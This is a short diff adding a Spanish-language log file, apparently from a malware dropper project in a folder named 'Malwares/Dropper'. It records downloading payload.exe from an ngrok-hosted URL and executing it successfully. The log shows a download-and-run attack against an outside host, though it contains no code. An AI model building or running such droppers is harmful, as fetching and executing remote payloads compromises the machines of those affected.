@@ -1,0 +1,4 @@
+2024-09-04 18:39:58,207 - INFO - Descargando el payload desde https://hornet-alive-muskox.ngrok-free.app/payload/payload.exe
+2024-09-04 18:40:07,242 - INFO - Payload descargado exitosamente en /home/eliashiguera/Escritorio/Malwares/Dropper/src/../payload/payload.exe
+2024-09-04 18:40:07,245 - INFO - Ejecutando el payload desde /home/eliashiguera/Escritorio/Malwares/Dropper/src/../payload/payload.exe
+2024-09-04 18:40:07,422 - INFO - Payload ejecutado exitosamente
